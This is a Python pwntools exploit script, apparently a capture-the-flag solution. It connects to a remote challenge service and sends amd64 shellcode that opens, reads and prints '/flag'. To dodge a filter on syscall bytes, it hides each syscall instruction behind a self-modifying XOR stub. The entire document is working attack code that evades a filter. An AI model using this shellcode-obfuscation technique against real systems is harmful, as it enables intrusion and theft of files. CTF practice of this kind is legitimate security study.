#-*- coding: utf-8 -*-
from pwn import *

r = remote("1047ee80.tendollar.kr", 10000)
print r.recvuntil("> ")

sc = shellcraft.amd64.openat(0, "/flag")
sc += shellcraft.amd64.read('rax', "rsp", 0x100)
sc += shellcraft.amd64.write(1, "rsp", 0x100)

# replace (syscall) to (nop; nop)
sc_asm = asm(sc, arch="amd64").replace("\x0f\x05", "\x90\x90")

# add xor logic before (nop; nop)
xor = '''
xor word ptr[rip], 0x959f
nop
nop
'''
xor_sc = asm(xor, arch="amd64")

sc_asm = sc_asm.replace("\x90\x90", xor_sc)
print disasm(sc_asm, arch="amd64")

r.send(sc_asm)
r.interactive()
